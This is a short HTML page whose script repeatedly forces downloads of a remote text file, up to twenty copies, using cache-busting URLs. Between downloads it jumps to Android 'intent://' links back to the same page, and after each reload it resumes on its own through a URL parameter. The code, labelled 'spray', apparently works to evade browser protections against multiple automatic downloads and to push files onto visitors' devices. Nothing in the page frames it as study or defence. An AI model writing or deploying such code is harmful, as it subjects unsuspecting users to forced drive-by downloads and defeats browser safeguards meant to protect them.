<!DOCTYPE html>
<html>
<body>

<button onclick="start()">Start Download</button>

<script>
let count = 0;
let MAX = 20;

// ✅ tera file URL
const FILE = "https://mrnoob790.github.io/ac.txt";

function download() {
    const a = document.createElement("a");
    
    // cache bypass (important)
    a.href = FILE + "?v=" + Math.random();
    
    a.download = "ac_" + count + ".txt";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

function jump(i) {
    // intent navigation (new context)
    location.href =
    "intent://" + location.host + location.pathname + "?c=" + i +
    "#Intent;scheme=https;end";
}

function spray() {
    if (count >= MAX) return;

    download();
    count++;

    setTimeout(() => {
        jump(count);
    }, 300);
}

// resume after reload
const params = new URLSearchParams(location.search);
if (params.has("c")) {
    count = parseInt(params.get("c"));
    spray();
}

function start() {
    spray();
}
</script>

</body>
</html>
